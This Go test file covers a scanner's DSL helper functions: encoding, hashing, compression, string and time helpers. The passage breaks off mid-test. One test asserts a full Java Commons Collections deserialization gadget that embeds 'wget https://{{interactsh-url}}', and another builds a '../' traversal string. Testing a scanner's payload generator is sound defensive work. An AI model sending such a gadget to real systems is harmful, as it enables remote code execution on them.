package dsl

import (
	"fmt"
	"math"
	"os"
	"regexp"
	"testing"
	"time"

	"github.com/Knetic/govaluate"
	"github.com/stretchr/testify/require"
	"golang.org/x/exp/maps"
)

func TestIndex(t *testing.T) {
	index, err := govaluate.NewEvaluableExpressionWithFunctions("index(split(url, '.', -1), 1) == 'example'", DefaultHelperFunctions)
	require.Nil(t, err, "could not compile index")

	result, err := index.Evaluate(map[string]interface{}{"url": "https://www.example.com"})
	require.Nil(t, err, "could not evaluate index")
	require.Equal(t, true, result, "could not get index data")
}

func TestDSLURLEncodeDecode(t *testing.T) {
	encoded, err := DefaultHelperFunctions["url_encode"]("&test\"")
	require.Nil(t, err, "could not url encode")
	require.Equal(t, "%26test%22", encoded, "could not get url encoded data")

	decoded, err := DefaultHelperFunctions["url_decode"]("%26test%22")
	require.Nil(t, err, "could not url encode")
	require.Equal(t, "&test\"", decoded, "could not get url decoded data")
}

func TestDSLTimeComparison(t *testing.T) {
	compiled, err := govaluate.NewEvaluableExpressionWithFunctions("unixtime() > not_after", DefaultHelperFunctions)
	require.Nil(t, err, "could not compare time")

	result, err := compiled.Evaluate(map[string]interface{}{"not_after": float64(time.Now().Unix() - 1000)})
	require.Nil(t, err, "could not evaluate compare time")
	require.Equal(t, true, result, "could not get url encoded data")
}

func TestDSLGzipSerialize(t *testing.T) {
	compiled, err := govaluate.NewEvaluableExpressionWithFunctions("gzip(\"hello world\")", DefaultHelperFunctions)
	require.Nil(t, err, "could not compile encoder")

	result, err := compiled.Evaluate(make(map[string]interface{}))
	require.Nil(t, err, "could not evaluate compare time")

	compiled, err = govaluate.NewEvaluableExpressionWithFunctions("gzip_decode(data)", DefaultHelperFunctions)
	require.Nil(t, err, "could not compile decoder")

	data, err := compiled.Evaluate(map[string]interface{}{"data": result})
	require.Nil(t, err, "could not evaluate decoded data")

	require.Equal(t, "hello world", data.(string), "could not get gzip encoded data")
}

func TestDslFunctionSignatures(t *testing.T) {
	createSignatureError := func(signature string) string {
		return fmt.Errorf("%w. correct method signature %q", ErrInvalidDslFunction, signature).Error()
	}

	errToUpperSignature := createSignatureError("to_upper(arg1 interface{}) interface{}")
	errRemoveBadCharsSignature := createSignatureError("remove_bad_chars(arg1, arg2 interface{}) interface{}")

	testCases := []struct {
		methodName string
		arguments  []interface{}
		expected   interface{}
		err        string
	}{
		{"to_upper", []interface{}{}, nil, errToUpperSignature},
		{"to_upper", []interface{}{"a"}, "A", ""},
		{"toupper", []interface{}{"a"}, "A", ""},
		{"to_upper", []interface{}{"a", "b", "c"}, nil, errToUpperSignature},

		{"remove_bad_chars", []interface{}{}, nil, errRemoveBadCharsSignature},
		{"remove_bad_chars", []interface{}{"a"}, nil, errRemoveBadCharsSignature},
		{"remove_bad_chars", []interface{}{"abba baab", "b"}, "aa aa", ""},
		{"remove_bad_chars", []interface{}{"a", "b", "c"}, nil, errRemoveBadCharsSignature},
	}

	helperFunctions := DefaultHelperFunctions
	for _, currentTestCase := range testCases {
		methodName := currentTestCase.methodName
		t.Run(methodName, func(t *testing.T) {
			actualResult, err := helperFunctions[methodName](currentTestCase.arguments...)

			if currentTestCase.err == "" {
				require.Nil(t, err)
			} else {
				require.Equal(t, err.Error(), currentTestCase.err)
			}
			require.Equal(t, currentTestCase.expected, actualResult)
		})
	}
}

func TestGetPrintableDslFunctionSignatures(t *testing.T) {
	expected := `	aes_cbc(arg1, arg2, arg3 interface{}) interface{}
	aes_gcm(arg1, arg2 interface{}) interface{}
	base64(arg1 interface{}) interface{}
	base64_decode(arg1 interface{}) interface{}
	base64_py(arg1 interface{}) interface{}
	bin_to_dec(arg1 interface{}) interface{}
	compare_versions(firstVersion, constraints ...string) bool
	concat(args ...interface{}) string
	contains(arg1, arg2 interface{}) interface{}
	contains_all(body interface{}, substrs ...string) bool
	contains_any(body interface{}, substrs ...string) bool
	count(str, substr string) int
	date_time(dateTimeFormat string, optionalUnixTime interface{}) string
	dec_to_hex(arg1 interface{}) interface{}
	deflate(arg1 interface{}) interface{}
	ends_with(str string, suffix ...string) bool
	equals_any(arg1, arg2 interface{}) interface{}
	generate_java_gadget(arg1, arg2, arg3 interface{}) interface{}
	generate_jwt(jsonString, algorithm, optionalSignature string, optionalMaxAgeUnix interface{}) string
	gzip(arg1 interface{}) interface{}
	gzip_decode(arg1 interface{}) interface{}
	hex_decode(arg1 interface{}) interface{}
	hex_encode(arg1 interface{}) interface{}
	hex_to_dec(arg1 interface{}) interface{}
	hmac(arg1, arg2, arg3 interface{}) interface{}
	html_escape(arg1 interface{}) interface{}
	html_unescape(arg1 interface{}) interface{}
	index(arg1, arg2 interface{}) interface{}
	inflate(arg1 interface{}) interface{}
	ip_format(arg1, arg2 interface{}) interface{}
	jarm(arg1 interface{}) interface{}
	join(separator string, elements ...interface{}) string
	join(separator string, elements []interface{}) string
	json_minify(arg1 interface{}) interface{}
	json_prettify(arg1 interface{}) interface{}
	len(arg1 interface{}) interface{}
	line_ends_with(str string, suffix ...string) bool
	line_starts_with(str string, prefix ...string) bool
	llm_prompt(prompt string, optionalModel string) string
	md5(arg1 interface{}) interface{}
	mmh3(arg1 interface{}) interface{}
	oct_to_dec(arg1 interface{}) interface{}
	padding(arg1, arg2, arg3, arg4 interface{}) interface{}
	print_debug(args ...interface{})
	public_ip() string
	rand_ach_account_number() string
	rand_ach_routing_number() string
	rand_action_verb() string
	rand_adjective() string
	rand_adverb() string
	rand_adverb_degree() string
	rand_adverb_frequency_definite() string
	rand_adverb_frequency_indefinite() string
	rand_adverb_manner() string
	rand_adverb_phrase() string
	rand_adverb_place() string
	rand_adverb_time_definite() string
	rand_adverb_time_indefinite() string
	rand_animal() string
	rand_animal_type() string
	rand_app_author() string
	rand_app_name() string
	rand_app_version() string
	rand_author() string
	rand_base(length uint, optionalCharSet string) string
	rand_beer_alcohol() string
	rand_beer_blg() string
	rand_beer_hop() string
	rand_beer_ibu() string
	rand_beer_malt() string
	rand_beer_name() string
	rand_beer_style() string
	rand_beer_yeast() string
	rand_bird() string
	rand_bitcoin_address() string
	rand_bitcoin_private_key() string
	rand_blurb() string
	rand_boolean() bool
	rand_breakfast() string
	rand_bs() string
	rand_buzzword() string
	rand_car_fuel_type() string
	rand_car_maker() string
	rand_car_model() string
	rand_car_transmission_type() string
	rand_car_type() string
	rand_cat() string
	rand_celebrity_actor() string
	rand_celebrity_business() string
	rand_celebrity_sport() string
	rand_char(optionalCharSet string) string
	rand_chrome_user_agent() string
	rand_city() string
	rand_color() string
	rand_comment() string
	rand_company() string
	rand_company_suffix() string
	rand_connective() string
	rand_connective_casual() string
	rand_connective_comparitive() string
	rand_connective_complaint() string
	rand_connective_examplify() string
	rand_connective_listing() string
	rand_connective_time() string
	rand_country() string
	rand_country_abbreviation() string
	rand_credit_card_cvv() string
	rand_credit_card_exp() string
	rand_credit_card_type() string
	rand_currency_long() string
	rand_currency_short() string
	rand_cusip() string
	rand_database_error() string
	rand_date(format string) string
	rand_daterange(startdate string, enddate string, format string) string
	rand_day() int
	rand_demonstrative_adjective() string
	rand_descriptive_adjective() string
	rand_dessert() string
	rand_digit() string
	rand_digitn(count uint) string
	rand_dinner() string
	rand_dog() string
	rand_domain_name() string
	rand_domain_suffix() string
	rand_drink() string
	rand_email() string
	rand_emoji() string
	rand_emoji_alias() string
	rand_emoji_category() string
	rand_emoji_description() string
	rand_emoji_tag() string
	rand_error() string
	rand_error_object_word() string
	rand_farm_animal() string
	rand_file_extension() string
	rand_file_mime_type() string
	rand_firefox_user_agent() string
	rand_first_name() string
	rand_flip_a_coin() string
	rand_float32() float32
	rand_float32_range(min float, max float) float32
	rand_float64() float64
	rand_float64_range(min float, max float) float64
	rand_fruit() string
	rand_futuredate() time
	rand_gamertag() string
	rand_gender() string
	rand_generate(str string) string
	rand_genre() string
	rand_grpc_error() string
	rand_hacker_abbreviation() string
	rand_hacker_adjective() string
	rand_hacker_noun() string
	rand_hacker_phrase() string
	rand_hacker_verb() string
	rand_hackering_verb() string
	rand_helping_verb() string
	rand_hex_color() string
	rand_hexuint(bitSize int) string
	rand_hipster_paragraph(paragraphcount int, sentencecount int, wordcount int, paragraphseparator string) string
	rand_hipster_sentence(wordcount int) string
	rand_hipster_word() string
	rand_hobby() string
	rand_hour() int
	rand_http_client_error() string
	rand_http_error() string
	rand_http_method() string
	rand_http_server_error() string
	rand_http_status_code() int
	rand_http_status_code_simple() int
	rand_http_version() string
	rand_image_jpeg(width int, height int) []byte
	rand_image_png(width int, height int) []byte
	rand_indefinite_adjective() string
	rand_input_name() string
	rand_int(optionalMin, optionalMax uint) int
	rand_int16() int16
	rand_int32() int32
	rand_int64() int64
	rand_int8() int8
	rand_interjection() string
	rand_interrogative_adjective() string
	rand_intn(n int) int
	rand_intrange(min int, max int) int
	rand_intransitive_verb() string
	rand_ip(cidr ...string) string
	rand_ipv4_address() string
	rand_ipv6_address() string
	rand_isin() string
	rand_job_descriptor() string
	rand_job_level() string
	rand_job_title() string
	rand_language() string
	rand_language_abbreviation() string
	rand_language_bcp() string
	rand_last_name() string
	rand_latitude() float
	rand_latitude_range(min float, max float) float
	rand_letter() string
	rand_lettern(count uint) string
	rand_lexify(str string) string
	rand_linking_verb() string
	rand_log_level() string
	rand_longitude() float
	rand_longitude_range(min float, max float) float
	rand_lorem_ipsum_paragraph(paragraphcount int, sentencecount int, wordcount int, paragraphseparator string) string
	rand_lorem_ipsum_sentence(wordcount int) string
	rand_lorem_ipsum_word() string
	rand_lunch() string
	rand_mac_address() string
	rand_middle_name() string
	rand_minecraft_animal() string
	rand_minecraft_armor_part() string
	rand_minecraft_armor_tier() string
	rand_minecraft_biome() string
	rand_minecraft_dye() string
	rand_minecraft_food() string
	rand_minecraft_mob_boss() string
	rand_minecraft_mob_hostile() string
	rand_minecraft_mob_neutral() string
	rand_minecraft_mob_passive() string
	rand_minecraft_ore() string
	rand_minecraft_tool() string
	rand_minecraft_villager_job() string
	rand_minecraft_villager_level() string
	rand_minecraft_villager_station() string
	rand_minecraft_weapon() string
	rand_minecraft_weather() string
	rand_minecraft_wood() string
	rand_minute() int
	rand_month() string
	rand_month_string() string
	rand_movie_name() string
	rand_name() string
	rand_name_prefix() string
	rand_name_suffix() string
	rand_nanosecond() int
	rand_nice_colors() []string
	rand_noun() string
	rand_noun_abstract() string
	rand_noun_collective_animal() string
	rand_noun_collective_people() string
	rand_noun_collective_thing() string
	rand_noun_common() string
	rand_noun_concrete() string
	rand_noun_countable() string
	rand_noun_determiner() string
	rand_noun_phrase() string
	rand_noun_proper() string
	rand_noun_uncountable() string
	rand_number(min int, max int) int
	rand_numerify(str string) string
	rand_opera_user_agent() string
	rand_paragraph(paragraphcount int, sentencecount int, wordcount int, paragraphseparator string) string
	rand_password(lower bool, upper bool, numeric bool, special bool, space bool, length int) string
	rand_pastdate() time
	rand_pet_name() string
	rand_phone() string
	rand_phone_formatted() string
	rand_phrase() string
	rand_possessive_adjective() string
	rand_preposition() string
	rand_preposition_compound() string
	rand_preposition_double() string
	rand_preposition_phrase() string
	rand_preposition_simple() string
	rand_price(min float, max float) float64
	rand_product_audience() []string
	rand_product_benefit() string
	rand_product_category() string
	rand_product_description() string
	rand_product_dimension() string
	rand_product_feature() string
	rand_product_material() string
	rand_product_name() string
	rand_product_suffix() string
	rand_product_upc() string
	rand_product_use_case() string
	rand_programming_language() string
	rand_pronoun() string
	rand_pronoun_demonstrative() string
	rand_pronoun_indefinite() string
	rand_pronoun_interrogative() string
	rand_pronoun_object() string
	rand_pronoun_personal() string
	rand_pronoun_possessive() string
	rand_pronoun_reflective() string
	rand_pronoun_relative() string
	rand_proper_adjective() string
	rand_quantitative_adjective() string
	rand_question() string
	rand_quote() string
	rand_random_markdown_document() string
	rand_random_text_email_document() string
	rand_regex(str string) string
	rand_rgb_color() []int
	rand_runtime_error() string
	rand_safari_user_agent() string
	rand_safe_color() string
	rand_school() string
	rand_second() int
	rand_sentence(wordcount int) string
	rand_simple_sentence() string
	rand_slogan() string
	rand_snack() string
	rand_song_artist() string
	rand_song_name() string
	rand_ssn() string
	rand_state() string
	rand_state_abbreviation() string
	rand_street() string
	rand_street_name() string
	rand_street_number() string
	rand_street_prefix() string
	rand_street_suffix() string
	rand_template(template string, data string) string
	rand_text_alpha(length uint, optionalBadChars string) string
	rand_text_alphanumeric(length uint, optionalBadChars string) string
	rand_text_numeric(length uint, optionalBadNumbers string) string
	rand_timezone() string
	rand_timezone_abbreviation() string
	rand_timezone_full() string
	rand_timezone_offset() float32
	rand_timezone_region() string
	rand_title() string
	rand_transitive_verb() string
	rand_uint() uint
	rand_uint16() uint16
	rand_uint32() uint32
	rand_uint64() uint64
	rand_uint8() uint8
	rand_uintn(n uint) uint
	rand_uintrange(min uint, max uint) uint
	rand_url() string
	rand_user_agent() string
	rand_username() string
	rand_uuid() string
	rand_validation_error() string
	rand_vegetable() string
	rand_verb() string
	rand_verb_phrase() string
	rand_vowel() string
	rand_weekday() string
	rand_word() string
	rand_year() int
	rand_zip() string
	regex(arg1, arg2 interface{}) interface{}
	regex_all(arg1, arg2 interface{}) interface{}
	regex_any(arg1, arg2 interface{}) interface{}
	remove_bad_chars(arg1, arg2 interface{}) interface{}
	repeat(arg1, arg2 interface{}) interface{}
	replace(arg1, arg2, arg3 interface{}) interface{}
	replace_regex(arg1, arg2, arg3 interface{}) interface{}
	reverse(arg1 interface{}) interface{}
	sha1(arg1 interface{}) interface{}
	sha256(arg1 interface{}) interface{}
	sha512(arg1 interface{}) interface{}
	sort(elements ...interface{}) []interface{}
	sort(input number) string
	sort(input string) string
	split(input string, n int) []string
	split(input string, separator string, optionalChunkSize) []string
	starts_with(str string, prefix ...string) bool
	substr(str string, start int, optionalEnd int)
	to_lower(arg1 interface{}) interface{}
	to_number(arg1 interface{}) interface{}
	to_string(arg1 interface{}) interface{}
	to_title(s, optionalLang string) string
	to_unix_time(input string, optionalLayout string) int64
	to_upper(arg1 interface{}) interface{}
	trim(arg1, arg2 interface{}) interface{}
	trim_left(arg1, arg2 interface{}) interface{}
	trim_prefix(arg1, arg2 interface{}) interface{}
	trim_right(arg1, arg2 interface{}) interface{}
	trim_space(arg1 interface{}) interface{}
	trim_suffix(arg1, arg2 interface{}) interface{}
	uniq(elements ...interface{}) []interface{}
	uniq(input number) string
	uniq(input string) string
	unix_time(optionalSeconds uint) float64
	unpack(arg1, arg2 interface{}) interface{}
	url_decode(arg1 interface{}) interface{}
	url_encode(arg1 interface{}) interface{}
	wait_for(seconds uint)
	xor(args ...interface{}) interface{}
	zip(file_entry string, content string, ... ) []byte
	zlib(arg1 interface{}) interface{}
	zlib_decode(arg1 interface{}) interface{}
`

	signatures := GetPrintableDslFunctionSignatures(true)
	require.Equal(t, expected, signatures)

	coloredSignatures := GetPrintableDslFunctionSignatures(false)
	// nolint
	require.Contains(t, coloredSignatures, `[93maes_cbc[0m(arg1, arg2, arg3 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m`, "could not get colored signatures")
}

func TestDslExpressions(t *testing.T) {
	dslExpressions := map[string]interface{}{
		`base64("Hello")`:                                "SGVsbG8=",
		`base64(1234)`:                                   "MTIzNA==",
		`base64_py("Hello")`:                             "SGVsbG8=\n",
		`hex_encode("aa")`:                               "6161",
		`html_escape("<body>test</body>")`:               "&lt;body&gt;test&lt;/body&gt;",
		`html_unescape("&lt;body&gt;test&lt;/body&gt;")`: "<body>test</body>",
		`md5("Hello")`:                                   "8b1a9953c4611296a827abf8c47804d7",
		`md5(1234)`:                                      "81dc9bdb52d04dc20036dbd8313ed055",
		`mmh3("Hello")`:                                  "316307400",
		`remove_bad_chars("abcd", "bc")`:                 "ad",
		`replace("Hello", "He", "Ha")`:                   "Hallo",
		`concat("Hello", 123, "world")`:                  "Hello123world",
		`join("_", "Hello", 123, "world")`:               "Hello_123_world",
		`repeat("a", 5)`:                                 "aaaaa",
		`repeat("a", "5")`:                               "aaaaa",
		`repeat("../", "5")`:                             "../../../../../",
		`repeat(5, 5)`:                                   "55555",
		`replace_regex("He123llo", "(\\d+)", "")`:        "Hello",
		`reverse("abc")`:                                 "cba",
		`sha1("Hello")`:                                  "f7ff9e8b7bb2e09b70935a5d785e0cc5d9d0abf0",
		`sha256("Hello")`:                                "185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969",
		`sha512("Hello")`:                                "3615f80c9d293ed7402687f94b22d58e529b8cc7916f8fac7fddf7fbd5af4cf777d3d795a7a00a16bf7e7f3fb9561ee9baae480da9fe7a18769e71886b03f315",
		`to_lower("HELLO")`:                              "hello",
		`to_upper("hello")`:                              "HELLO",
		`trim("aaaHelloddd", "ad")`:                      "Hello",
		`trim_left("aaaHelloddd", "ad")`:                 "Helloddd",
		`trim_prefix("aaHelloaa", "aa")`:                 "Helloaa",
		`trim_right("aaaHelloddd", "ad")`:                "aaaHello",
		`trim_space("  Hello  ")`:                        "Hello",
		`trim_suffix("aaHelloaa", "aa")`:                 "aaHello",
		`url_decode("https:%2F%2Fprojectdiscovery.io%3Ftest=1")`: "https://projectdiscovery.io?test=1",
		`url_encode("https://projectdiscovery.io/test?a=1")`:     "https%3A%2F%2Fprojectdiscovery.io%2Ftest%3Fa%3D1",
		`gzip("Hello")`:         "\x1f\x8b\b\x00\x00\x00\x00\x00\x00\xff\xf2H\xcd\xc9\xc9\a\x04\x00\x00\xff\xff\x82\x89\xd1\xf7\x05\x00\x00\x00",
		`zip("aaa.txt","abcd")`: ([]byte("PK\x03\x04\x14\x00\x08\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00aaa.txtJLJN\x01\x04\x00\x00\xff\xffPK\x07\x08\x11\xcd\x82\xed\n\x00\x00\x00\x04\x00\x00\x00PK\x01\x02\x14\x00\x14\x00\x08\x00\x08\x00\x00\x00\x00\x00\x11\xcd\x82\xed\n\x00\x00\x00\x04\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00aaa.txtPK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x005\x00\x00\x00?\x00\x00\x00\x00\x00")),
		`zlib("Hello")`:         "\x78\x9c\xf2\x48\xcd\xc9\xc9\x07\x04\x00\x00\xff\xff\x05\x8c\x01\xf5",
		`zlib_decode(hex_decode("789cf248cdc9c907040000ffff058c01f5"))`: "Hello",
		`deflate("Hello")`:                              "\xf2\x48\xcd\xc9\xc9\x07\x04\x00\x00\xff\xff",
		`inflate(hex_decode("f348cdc9c90700"))`:         "Hello",
		`inflate(hex_decode("f248cdc9c907040000ffff"))`: "Hello",
		`gzip_decode(hex_decode("1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000"))`:       "Hello",
		`generate_java_gadget("commons-collections3.1", "wget https://{{interactsh-url}}", "base64")`: "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAJmh0dHBzOi8vZ2l0aHViLmNvbS9qb2FvbWF0b3NmL2pleGJvc3Mgc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl%2BwoepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAFc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh%2Bj/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AGwAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB%2BABtzcQB%2BABN1cQB%2BABgAAAACcHVxAH4AGAAAAAB0AAZpbnZva2V1cQB%2BABsAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAYc3EAfgATdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAH3dnZXQgaHR0cHM6Ly97e2ludGVyYWN0c2gtdXJsfX10AARleGVjdXEAfgAbAAAAAXEAfgAgc3EAfgAPc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4eA==",
		`generate_jwt("{\"name\":\"John Doe\",\"foo\":\"bar\"}", "HS256", "hello-world")`:             []byte("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmb28iOiJiYXIiLCJuYW1lIjoiSm9obiBEb2UifQ.EsrL8lIcYJR_Ns-JuhF3VCllCP7xwbpMCCfHin_WT6U"),
		`base64_decode("SGVsbG8=")`:                               "Hello",
		`hex_decode("6161")`:                                      "aa",
		`len("Hello")`:                                            float64(5),
		`len(1234)`:                                               float64(4),
		`len(split("1.2.3.4",'.',-1))`:                            float64(4),
		`contains("Hello", "lo")`:                                 true,
		`starts_with("Hello", "He")`:                              true,
		`ends_with("Hello", "lo")`:                                true,
		"line_starts_with('Hi\nHello', 'He')":                     true, // back quotes do not support escape sequences
		"line_ends_with('Hii\nHello', 'ii')":                      true, // back quotes do not support escape sequences
		`regex("H([a-z]+)o", "Hello")`:                            true,
		`wait_for(1)`:                                             nil,
		`padding("A","b",3,'suffix')`:                             "Abb",
		`padding("A","b",3,'prefix')`:                             "bbA",
		`print_debug(1+2, "Hello")`:                               nil,
		`to_number('4')`:                                          float64(4),
		`to_string(4)`:                                            "4",
		`dec_to_hex(7001)`:                                        "1b59",
		`hex_to_dec("ff")`:                                        float64(255),
		`hex_to_dec("0xff")`:                                      float64(255),
		`oct_to_dec("0o1234567")`:                                 float64(342391),
		`oct_to_dec("1234567")`:                                   float64(342391),
		`oct_to_dec(1234567)`:                                     float64(342391),
		`bin_to_dec("0b1010")`:                                    float64(10),
		`bin_to_dec("1010")`:                                      float64(10),
		`bin_to_dec(1010)`:                                        float64(10),
		`compare_versions('v1.0.0', '<1.1.1')`:                    true,
		`compare_versions('v1.1.1', '>v1.1.0')`:                   true,
		`compare_versions('v1.0.0', '>v0.0.1,<v1.0.1')`:           true,
		`compare_versions('v1.0.0', '>v0.0.1', '<v1.0.1')`:        true,
		`hmac('sha1', 'test', 'scrt')`:                            "8856b111056d946d5c6c92a21b43c233596623c6",
		`hmac('sha256', 'test', 'scrt')`:                          "1f1bff5574f18426eb376d6dd5368a754e67a798aa2074644d5e3fd4c90c7a92",
		`hmac('sha512', 'test', 'scrt')`:                          "1d3fff1dbb7369c1615ffb494813146bea051ce07e5d44bdeca539653ea97656bf9d38db264cddbe6a83ea15139c8f861a7e73e10e43ad4865e852a9ee6de2e9",
		`substr('xxtestxxx',2)`:                                   "testxxx",
		`substr('xxtestxxx',2,4)`:                                 "te",
		`substr('xxtestxxx',2,6)`:                                 "test",
		`sort(12453)`:                                             "12345",
		`sort("a1b2c3d4e5")`:                                      "12345abcde",
		`sort("b", "a", "2", "c", "3", "1", "d", "4")`:            []string{"1", "2", "3", "4", "a", "b", "c", "d"},
		`split("abcdefg", 2)`:                                     []string{"ab", "cd", "ef", "g"},
		`split("ab,cd,efg", ",", 1)`:                              []string{"ab,cd,efg"},
		`split("ab,cd,efg", ",", 2)`:                              []string{"ab", "cd,efg"},
		`split("ab,cd,efg", ",", "3")`:                            []string{"ab", "cd", "efg"},
		`split("ab,cd,efg", ",", -1)`:                             []string{"ab", "cd", "efg"},
		`split("ab,cd,efg", ",")`:                                 []string{"ab", "cd", "efg"},
		`join(" ", sort("b", "a", "2", "c", "3", "1", "d", "4"))`: "1 2 3 4 a b c d",
		`uniq(123123231)`:                                         "123",
		`uniq("abcabdaabbccd")`:                                   "abcd",
		`uniq("ab", "cd", "12", "34", "12", "cd")`:                []string{"ab", "cd", "12", "34"},
		`join(" ", uniq("ab", "cd", "12", "34", "12", "cd"))`:     "ab cd 12 34",
		`join(", ", split(hex_encode("abcdefg"), 2))`:             "61, 62, 63, 64, 65, 66, 67",
		`json_minify("{  \"name\":  \"John Doe\",   \"foo\":  \"bar\"     }")`:     "{\"foo\":\"bar\",\"name\":\"John Doe\"}",
		`json_prettify("{\"foo\":\"bar\",\"name\":\"John Doe\"}")`:                 "{\n    \"foo\": \"bar\",\n    \"name\": \"John Doe\"\n}",
		`ip_format('127.0.0.1', '1')`:                                              "127.0.0.1",
		`ip_format('127.0.0.1', '3')`:                                              "0177.0.0.01",
		`ip_format('127.0.0.1', '5')`:                                              "2130706433",
		`ip_format('127.0.1.0', '11')`:                                             "127.0.256",
		"unpack('>I', '\xac\xd7\t\xd0')":                                           -272646673,
		"xor('\x01\x02', '\x02\x01')":                                              []uint8([]byte{0x3, 0x3}),
		`count("projectdiscovery", "e")`:                                           2,
		`concat(to_title("pRoJeCt"), to_title("diScOvErY"))`:                       "ProjectDiscovery",
		`concat(to_title("welcome "), "to", to_title(" watch"), to_title("mojo"))`: "Welcome to WatchMojo",
	}

	testDslExpressions(t, dslExpressions)
}

func TestDateTimeDSLFunction(t *testing.T) {
	testDateTimeFormat := func(t *testing.T, dateTimeFormat string, dateTimeFunction *govaluate.EvaluableExpression, expectedFormattedTime string, currentUnixTime int64) {
		dslFunctionParameters := map[string]interface{}{"dateTimeFormat": dateTimeFormat}

		if currentUnixTime != 0 {
			dslFunctionParameters["unixTime"] = currentUnixTime
		}

		result, err := dateTimeFunction.Evaluate(dslFunctionParameters)

		require.Nil(t, err, "could not evaluate compare time")

		require.Equal(t, expectedFormattedTime, result.(string), "could not get correct time format string")
	}

	t.Run("with unix time", func(t *testing.T) {
		dateTimeFunction, err := govaluate.NewEvaluableExpressionWithFunctions("date_time(dateTimeFormat)", DefaultHelperFunctions)
		require.Nil(t, err, "could not compile encoder")

		currentTime := time.Now()
		expectedFormattedTime := currentTime.Format("02-01-2006 15:04")
		testDateTimeFormat(t, "02-01-2006 15:04", dateTimeFunction, expectedFormattedTime, 0)
		testDateTimeFormat(t, "%D-%M-%Y %H:%m", dateTimeFunction, expectedFormattedTime, 0)
	})

	t.Run("without unix time", func(t *testing.T) {
		dateTimeFunction, err := govaluate.NewEvaluableExpressionWithFunctions("date_time(dateTimeFormat, unixTime)", DefaultHelperFunctions)
		require.Nil(t, err, "could not compile encoder")

		currentTime := time.Now()
		currentUnixTime := currentTime.Unix()
		expectedFormattedTime := currentTime.Format("02-01-2006 15:04")
		testDateTimeFormat(t, "02-01-2006 15:04", dateTimeFunction, expectedFormattedTime, currentUnixTime)
		testDateTimeFormat(t, "%D-%M-%Y %H:%m", dateTimeFunction, expectedFormattedTime, currentUnixTime)
	})
}

func TestDateTimeDslExpressions(t *testing.T) {
	t.Run("date_time", func(t *testing.T) {
		now := time.Now()

		dslExpressions := map[string]interface{}{
			`date_time("%Y-%M-%D")`:                fmt.Sprintf("%02d-%02d-%02d", now.Year(), now.Month(), now.Day()),
			`date_time("%Y-%M-%D", unix_time())`:   fmt.Sprintf("%02d-%02d-%02d", now.Year(), now.Month(), now.Day()),
			`date_time("%Y-%M-%D", 1642032000)`:    time.Date(2022, 01, 13, 0, 0, 0, 0, time.UTC).Local().Format("2006-01-02"),
			`date_time("%H-%m")`:                   fmt.Sprintf("%02d-%02d", now.Hour(), now.Minute()),
			`date_time("02-01-2006", unix_time())`: now.Format("02-01-2006"),
			`date_time("02-01-2006", 1642032000)`:  time.Date(2022, 01, 13, 0, 0, 0, 0, time.UTC).Local().Format("02-01-2006"),
		}

		testDslExpressions(t, dslExpressions)
	})

	t.Run("to_unix_time(input string) int", func(t *testing.T) {
		expectedUtcTime := time.Date(2022, 01, 13, 16, 30, 10, 0, time.UTC)

		dateTimeInputs := map[string]time.Time{
			// UTC time
			"2022-01-13T16:30:10Z":      expectedUtcTime,
			"2022-01-13T16:30:10+00:00": expectedUtcTime,
